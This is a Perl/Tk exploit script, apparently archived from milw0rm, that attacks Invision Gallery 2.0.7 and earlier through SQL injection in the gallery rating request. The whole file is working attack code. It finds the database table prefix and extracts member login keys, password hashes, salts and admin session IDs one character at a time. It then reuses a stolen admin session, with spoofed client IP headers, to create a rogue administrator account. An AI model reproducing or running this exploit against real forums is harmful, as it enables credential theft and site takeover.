#!/usr/bin/perl

## Invision Gallery version <= 2.0.7 sql injection exploit
## (c)oded by 1dt.w0lf
## RST/GHC

##        THIS IS UNPUBLISHED RST/GHC EXPLOIT CODE
##                   KEEP IT PRIVATE

use Tk;
use Tk::BrowseEntry;
use Tk::DialogBox;
use LWP::UserAgent;

$mw = new MainWindow(title => "r57ig207" );

$mw->geometry ( '420x510' ) ;
$mw->resizable(0,0);

$mw->Label(-text => '!', -font => '{Webdings} 22')->pack();
$mw->Label(-text => 'Invision Gallery <=2.0.7 sql injection exploit by RST/GHC', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
$mw->Label(-text => '')->pack();

$fleft=$mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
$fright=$mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

$url = 'http://server/forum/index.php';
$user_id = '1';
$prefix = 'ibf_';
$table = 'members';
$column = 'member_login_key';
$new_admin_name = 'rstghc';
$new_admin_password = 'rstghc';
$new_admin_email = 'billy@microsoft.com';
$report = '';
$group = 1;
$curr_user = 0;
$use_custom_fields = 0;
$custom_fields = 'name1=value1,name2=value2';

$fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$prefix) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fright->Label( -text => ' ')->pack();
$fleft->Label( -text => ' ')->pack();

$fleft->Label ( -text => 'get data from database', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Label( -text => ' ')->pack();

$fleft->Label ( -text => 'Get data from table: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$b2 = $fright->BrowseEntry( -command => \&update_columns, -relief => "groove", -variable => \$table, -font => '{Verdana} 8');
$b2->insert("end", "members");
$b2->insert("end", "members_converge");
$b2->insert("end", "admin_sessions");
$b2->insert("end", "validating");
$b2->pack( -side => "top" , -anchor => 'w');

$fleft->Label ( -text => 'Get data from column: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$b = $fright->BrowseEntry( -relief => "groove", -variable => \$column, -font => '{Verdana} 8');
$b->insert("end", "member_login_key");
$b->insert("end", "name");
$b->insert("end", "ip_address");
$b->insert("end", "legacy_password");
$b->insert("end", "email");
$b->pack( -side => "top" , -anchor => 'w' );

$fleft->Label ( -text => 'Returned data: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$report) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'create new admin', -font => '{Verdana} 8 bold',-foreground=>'green') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Label( -text => ' ')->pack();

$fleft->Label ( -text => 'session_id: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$session_id) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'session_ip_address: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$session_ip_address) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'new admin name: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$new_admin_name) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'new admin password: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$new_admin_password) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => 'new_admin_email: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$new_admin_email) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fleft->Label ( -text => ' ')->pack();
$fright->Checkbutton( -font => '{Verdana} 8', -text => 'Use custom profile fields', -variable => \$use_custom_fields)->pack(-side => "top" , -anchor => 'w');

$fleft->Label ( -text => 'custom fields: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$custom_fields) ->pack ( -side => "top" , -anchor => 'w' ) ;

$fright->Label( -text => ' ')->pack();

$fright->Button(-text    => 'Test forum vulnerability',
                -relief => "groove",
                -width => '30',
                -font => '{Verdana} 8 bold',
                -activeforeground => 'red',
                -command => \&test_vuln
               )->pack();

$fright->Button(-text    => 'Get database tables prefix',
                -relief => "groove",
                -width => '30',
                -font => '{Verdana} 8 bold',
                -activeforeground => 'red',
                -command => \&get_prefix
               )->pack();

$fright->Button(-text    => 'Get data from database',
                -relief => "groove",
                -width => '30',
                -font => '{Verdana} 8 bold',
                -activeforeground => 'red',
                -command => \&get_data
               )->pack();

$fright->Button(-text    => 'Create new admin',
                -relief => "groove",
                -width => '30',
                -font => '{Verdana} 8 bold',
                -activeforeground => 'red',
                -command => \&create_admin
               )->pack();



$fleft->Label( -text => ' ')->pack();
$fleft->Label( -text => '+++ PRIV8 +++', -font => '{Verdana} 7')->pack();
$fleft->Label( -text => '(c)oded by 1dt.w0lf', -font => '{Verdana} 7')->pack();
$fleft->Label( -text => 'RST/GHC', -font => '{Verdana} 7')->pack();

MainLoop();

sub update_columns()
 {
 $b->delete(0,"end");
 if($table eq 'members'){
 $column = "member_login_key";  
 $b->insert("end", "member_login_key");
 $b->insert("end", "name");
 $b->insert("end", "ip_address");
 $b->insert("end", "legacy_password");
 $b->insert("end", "email");
 } elsif($table eq 'members_converge'){
 $column = "converge_pass_hash";  
 $b->insert("end", "converge_pass_hash");
 $b->insert("end", "converge_pass_salt");
 $b->insert("end", "converge_email");
 } elsif($table eq 'admin_sessions'){
 $column = "session_id";  
 $b->insert("end", "session_id");
 $b->insert("end", "session_ip_address");
 $b->insert("end", "session_member_name");
 $b->insert("end", "session_member_id");
 } elsif($table eq 'validating'){
 $column = "vid";  
 $b->insert("end", "vid");
 }
 }

sub get_data()
{
$xpl = LWP::UserAgent->new( ) or die;
$InfoWindow=$mw->DialogBox(-title   => 'get data from database', -buttons => ["OK"]);
if($table eq 'members') { $id_text = 'id'; }
if($table eq 'members_converge') { $id_text = 'converge_id'; }
if($table eq 'admin_sessions') { $id_text = 'session_member_id'; }
if($table eq 'validating') { $id_text = 'member_id'; }
$i = 1;
$report = '';
while(1)
 {
 $ret = get_char($i);
 if($ret == 0) { last; }
 else { $report .= chr($ret); $i++; $mw->update(); }
 }
 if($report eq '') {
 $InfoWindow->add('Label', -text => 'Can\'t get data', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
 } else {
 if($column eq 'session_id') { $session_id = $report; $mw->update(); }
 elsif($column eq 'session_ip_address') { $session_ip_address = $report; $mw->update(); }
 $InfoWindow->add('Label', -text => 'Done!', -font => '{Verdana} 8 bold',-foreground=>'green')->pack;
 }  
 $InfoWindow->Show();
 $InfoWindow->destroy;
}

sub get_char()
 {
 $res = $xpl->get($url."?automodule=gallery&cmd=rate&img=1&rating=1&album=-1 union select 1,ascii(substring(".$column.",".$_[0].",1)),1,1,1,1,1,1,1,1 FROM $prefix$table WHERE $id_text = $user_id");
 if($res->as_string =~ /cmd=user&user=(\d*)&op=view_album/) { $rep = $1; }
 else { $rep = 0; }
 return $rep;
 }
 
sub create_admin()
 {
 $InfoWindow=$mw->DialogBox(-title   => 'create new admin', -buttons => ["OK"]);
 if($session_id eq '' || $session_ip_address eq '')
  {
  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
  $InfoWindow->add('Label', -text => 'You need insert admin session_id and session_ip_address', -font => '{Verdana} 8')->pack;
  }
 elsif($session_ip_address !~ /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
  {
  $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
  $InfoWindow->add('Label', -text => 'session_ip_address wrong!', -font => '{Verdana} 8')->pack;
  }
 else
  {
 $xpl = LWP::UserAgent->new( ) or die;
 ($url2 = $url) =~ s/index.php/admin.php/;
 $cf = '';
 %fields = (
 'code'     => 'doadd',
 'act'      => 'mem',
 'section'  => 'content',
 'name'     => $new_admin_name,
 'password' => $new_admin_password,
 'email'    => $new_admin_email,
 'mgroup'   => 4, ## default admin group , maybe need change    
           );
 if($use_custom_fields)
  {
  @cf = split(',',$custom_fields);
  foreach(@cf) { ($k,$v) = split('=',$_); $fields{$k} = $v;}
  }
 
 $res = $xpl->post($url2."?adsess=$session_id",
 [
 %fields,
 ],
 'USER_AGENT'=>'',
 'CLIENT_IP'=>"$session_ip_address",
 'X_FORWARDED_FOR'=>"$session_ip_address");
 $InfoWindow->add('Label', -text => 'Done!', -font => '{Verdana} 8 bold',-foreground=>'green')->pack;
 $InfoWindow->add('Label', -text => 'New admin created', -font => '{Verdana} 8 bold')->pack; 
  }
 $InfoWindow->Show();
 $InfoWindow->destroy;
 }

sub test_vuln()
{
$InfoWindow=$mw->DialogBox(-title   => 'test forum vulnerability', -buttons => ["OK"]);
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?automodule=gallery&cmd=rate&img=1&rating=1&album=-1 union select 1,11457,1,1,1,1,1,1,1,1/*");
if($res->is_success)
 {
 $rep = '';
 if($res->as_string =~ /cmd=user&user=(\d*)&op=view_album/) { $rep = $1; }
 if($rep == 11457) { $InfoWindow->add('Label', -text => 'FORUM VULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }
 else { $InfoWindow->add('Label', -text => 'FORUM UNVULNERABLE', -font => '{Verdana} 8 bold',-foreground=>'green')->pack; }
 }
else
 {
 $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
 $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;
 }
$InfoWindow->Show();
$InfoWindow->destroy;
}

 
sub get_prefix()
{
$InfoWindow=$mw->DialogBox(-title   => 'get database tables prefix', -buttons => ["OK"]);
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => $url, -font => '{Verdana} 8')->pack;
$InfoWindow->add('Label', -text => '', -font => '{Verdana} 8')->pack;
$xpl = LWP::UserAgent->new( ) or die;
$res = $xpl->get($url."?automodule=gallery&cmd=rate&img=1&rating=1&album=-1\\");
if($res->is_success)
 {
 $rep = '';
 if($res->as_string =~ /FROM (.*)gallery_albums/)
 {
 $prefix = $1;
 $InfoWindow->add('Label', -text => 'Prefix: '.$prefix, -font => '{Verdana} 8 bold')->pack;
 }
 else
 {
 $InfoWindow->add('Label', -text => 'Can\'t get prefix', -font => '{Verdana} 8 bold',-foreground=>'red')->pack; }
 }
else
 {
 $InfoWindow->add('Label', -text => 'Error!', -font => '{Verdana} 8 bold',-foreground=>'red')->pack;
 $InfoWindow->add('Label', -text => $res->status_line, -font => '{Verdana} 8')->pack;
 }
$InfoWindow->Show();
$InfoWindow->destroy;  
}

# milw0rm.com [2008-01-22]
